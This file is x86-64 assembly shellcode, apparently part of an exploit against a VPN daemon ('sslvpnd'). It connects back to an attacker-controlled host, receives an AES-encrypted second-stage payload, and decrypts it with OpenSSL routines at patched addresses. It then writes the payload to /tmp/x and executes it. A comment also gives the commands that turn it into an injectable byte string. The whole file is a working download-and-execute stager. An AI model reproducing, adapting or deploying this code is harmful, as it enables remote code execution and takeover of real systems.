# assemble: as -o shellcode.o shellcode.s
#  convert: objdump -d -M intel shellcode.o|egrep '^...[a-z0-9]:'|cut -c 7-28|tr -d '\n'|tr -d ' '|tr -d '\t'|sed 's/\(..\)/\\x\1/g'

        .global _shellcode
        .global _readloop
        .text

_shellcode:

        # socket(2)
        movq   $0x2,  %rdi                              # AF_INET
        movq   $0x1,  %rsi                              # SOCK_STREAM
        movq   $0x0,  %rdx                              # 0
        movq   $0x29, %rax                              # 41 = 0x29 = socket syscall
        syscall                                         # rax = socket(AF_INET, SOCK_STREAM, 0);
        movq   %rax, %rbx                               # save socket fd in rbx


        # connect(2)

        # We're going to build a hokey sockaddr_in struct using registers, then push it to the stack.
        # Here's the struct:
        #
        # struct sockaddr_in {
        #       short            sin_family;   // e.g. AF_INET
        #       unsigned short   sin_port;     // e.g. htons(3490)
        #       struct in_addr   sin_addr;     // see struct in_addr, below
        #       char             sin_zero[8];  // zero this by convention
        # };
        # 
        # struct in_addr {
        #       unsigned long s_addr;          // little endian byte order IPv4 address
        # };
        xorq   %rdx, %rdx                               
        pushq  %rdx                                     # push 0x0000000000000000 (sockaddr_in->sin_zero)
        # I = IP address
        # P = TCP port
        # F = AF_INET
        #         IIIIIIIIPPPPFFFF
        movq   $0x5858585858580002, %rdx                # sockaddr_in-> sin_addr, sin_port, sin_family
        pushq  %rdx                                     # store it after sin_zero on the stack
        movq   %rax,  %rdi                              # %rax = sock # from socket() syscall
        movq   $0x10, %rdx                              # sizeof(sockaddr_in) = 16 bytes
        movq   %rsp,  %rsi                              # sockaddr_in struct is on stack @ %rsp
        movq   $0x2a, %rax                              # connect(2) syscall
        syscall

        # write(2) response to the stager to say hello
        subq   $0x20,  %rsi
        movabs $0x3838383838383838, %rax
        movq   %rax,  (%rsi)                            # response contains whatever the exploit patched in here.
        movq   %rbx,   %rdi                             # socket fd -> rdi
        movq   $0x8,   %rdx                             # payload len = 8 bytes
        movq   $0x1,   %rax                             # write(2) syscall
        syscall                                          # connect() to hax0r host
        
        # read(2) 4 bytes to use as size X for next read
        movq   %rbx,  %rdi                              # fd -> rdi
        movq   %rsp,  %rsi                              # stack ptr -> rsi
        subq   $0x8,  %rsi                              # move rsi up 8 bytes (storage location)
        movq   $0x4,  %rdx                              # read 4 bytes
        movq   $0x0,  %rax                              # read(2) system call
        syscall                                         # read 4 bytes from socket. use it as <size> for the next payload.

        # save the payload size in r13
        movq   (%rsi), %rdx                              # rdx = num bytes to read from socket
        movq   %rdx,   %r13                              # save payload size in r13

        # calloc(size_of_encrypted_payload)
        movabs $0x3535353535353535, %rax
        movq   %r13,  %rdi
        movq   $0x1,  %rsi
        callq  *%rax

        # read(2) X bytes of payload
        #
        # It's word / byte size issues here. 4byte len, 8byte regs.
        #
        movq   %r13,   %rdx                              # encrypted payload size in bytes
        movq   %rbx,   %rdi                              # socket fd
        movq   %rax,   %rsi                              # address of calloc()'d buffer
        movq   %rsi,   %r12                              # save calculated payload address in r12
        xorq   %rcx,   %rcx                              # flags = 0
        movq   $0x0,   %r8                               # srcaddr = NULL
        movq   $0x0,   %r9                               # addrlen = 0
        xorq   %r10,   %r10                              # use r10 to track total bytes read so far

        # rdi = fd
        # rsi = storage ptr
        # rdx = num bytes to read
        # rcx = flags
        # r8  = NULL
        # r9  = 0
        # rax = 0x2d (recvfrom syscall #)
        # call: recvfrom(rdi, rsi, rdx, rcx, r8, r9) 
        # r13 = size of payload
        # r15 = num bytes left to read
_readloop:      
        movq   $0x2d,  %rax                              # recvfrom(2) syscall
        syscall                                          # try to read rdx <size> bytes
        cmpq   $-0x1,  %rax
        jle _readfinished                                # abort on error
        addq   %rax,  %r10                               # keep track of total bytes read                               
        addq   %rax,  %rsi                               # add num bytes just read to payload buffer address
        movq   %r13,  %r11
        subq   %r10,  %r11
        movq   %r11,  %rdx
        cmpq   %r10,  %r13                               # if we read all the bytes...
        jg _readloop                                     # ...then exit the loop, otherwise read some more

_readfinished:

        # we have finished reading the payload.
        # write(0xbf) goodbye response to the stager.
        movq   %rsp,   %rsi                             # source buffer is in rsi
        addq   $0x8,   %rsi                             # clobber the start of the shellcode nop sled, who cares
        movabs $0x3838383838383838, %rax
        movq   %rax,  (%rsi)                            # response contains whatever the exploit patched in here.
        movq   %rbx,   %rdi                             # socket fd -> rdi
        movq   $0x8,   %rdx                             # payload len = 8 bytes
        movq   $0x1,   %rax                             # write(2) syscall
        syscall 

        # close the socket
        movq   %rbx,   %rdi                             # socket fd -> rdi
        movq   $0x3,   %rax                             # close(2)
        syscall                                         # close the socket

        # at this point we have the encrypted payload in memory. r12 is a pointer.
        # create another pointer: 
        # r14 -> buffer for decrypted payload (re-use the encrypted buffer!)
        movq   %r12,   %r14
        
        # r15 -> AES_key struct (244 bytes, but allow more)
        movq   %rsp,   %rdx
        subq   $0x200, %rdx
        movq   %rdx,   %r15

        # r10 -> actual AES key (16 bytes)
        subq   $0x10,  %rdx
        movq   %rdx,   %r10

        # r11 -> iv
        subq   $0x10,  %rdx
        movq   %rdx,   %r11

        # reminder of things in callee-saved regs at this stage:
        #  r12 = ptr to encrypted payload
        #  r13 = length of encrypted payload
        #  r14 = ptr to buffer for decrypted payload
        #  r15 = OpenSSL AES_key struct
        # and caller-saved:
        #  r10 = AES key
        #  r11 = iv

        # These placeholders will be patched by the exploit at runtime.
        # The patched bytes are a one-time-use 128-bit AES key used by the exploit 
        # to encrypt the payload we just received. We'll decrypt it next.
        # First let's push the 16-byte key onto the stack.
        movabs $0x3030303030303030, %rax
        movq   %r10,   %rdx
        movq   %rax,   (%rdx)                     
        movabs $0x3131313131313131, %rax
        movq   %rax,   0x8(%rdx, 1)

        # put the IV adjacent to the AES key on the stack
        movabs $0x0,   %rax
        movq   %r11,   %rdx
        movq   %rax,   (%rdx)
        movq   %rax,   0x8(%rdx, 1)

        # setup and call OpenSSL's AES_set_decrypt_key()
        movq   %r10,   %rdi                             # ptr to AES key bytes
        movq   $0x80,  %rsi                             # 128 (0x80) bits
        movq   %r15,   %rdx                             # AES_key struct address
        movabs $0x3333333333333333, %rax                # replaced at runtim with real GOT address
        movq   %rax,   %rcx                             # address of AES_set_decrypt_key()
        movq   %rsp,   %rbx
        addq   $0x4000,%rsp
        callq  *%rcx
        movq   %rbx,   %rsp

        # setup and call OpenSSL's AES_cbc_encrypt()
        movq   %r12,   %rdi                             # encrypted data
        movq   %r14,   %rsi                             # buffer for decrypted data
        movq   %r13,   %rdx                             # encrypted data length
        movq   %r15,   %rcx                             # OpenSSL AES_key struct 
        movq   %r15,   %r8                              
        subq   $0x20,  %r8                              # iv
        movq   $0x0,   %r9                              # AES_DECRYPT
        movabs $0x3434343434343434, %rax                # AES_cbc_encrypt()
        movq   %rsp,   %rbx
        addq   $0x4000,%rsp
        callq  *%rax
        movq   %rbx,   %rsp

        # write the cleartext payload to disk

        # open("/tmp/x", O_CREAT | O_RDWR)
        movabs $0x00782f706d742f, %rax                  # /tmp/x\x00
        movq   %rsp,   %rdi                             # stack ptr -> rdi
        subq   $0x8,   %rdi                             # we'll place filename at rsp-8
        movq   %rax,   (%rdi)                           # store filename on stack at rsp-8
        movq   $0x42,  %rsi                             # O_CREAT | O_RDWR
        movq   $0x1ff, %rdx                             # 0777 & OS umask = 0755
        movq   $0x2,   %rax                             # open(2)
        syscall                                         # open("/tmp/x", O_CREAT | O_RDWR, 0777);

        # write(payload) to "/tmp/x"
        # The value 0x3232323232323232 will be patched at runtime by the exploit and 
        # contains the real length of the payload, not the padded length used for AES CBC.
        movq   %rax,   %rdi                             # /tmp/x fd -> rdi
        movq   %rax,   %r13                             # save a copy of the fd
        movq   %r14,   %rsi                             # decrypted payload address -> rsi
        movabs $0x3232323232323232, %rax                # payload len -> rdx
        movq   %rax,   %rdx
        movq   $0x1,   %rax                             # write(2) syscall
        syscall                                         # write payload to /tmp/x
        
        # close "/tmp/x"                                
        movq   %r13,   %rdi                             # file fd -> rdi
        movq   $0x3,   %rax                             # close(2)
        syscall                                         # close the /tmp/x file descriptor

        # call execve()
        movabs $0x00782f706d742f, %rax                  # /tmp/x\x00
        movq   %rax,   (%r12)                           # "/tmp/x\x00" into mem @ r14
        movq   %r12,   %rdi                             # address of /tmp/x into rdi
        movq   $0x0,   %rsi
        movq   $0x0,   %rdx
        movq   $0x3b,  %rax                             # execve syscall
        syscall

_final:
        # call _exit()                                  # exit cleanly. The watchdog restarts sslvpnd.
        movq   $0xe7,  %rax
        xorq   %rdi,   %rdi
        syscall

####### EOF is never reached ########
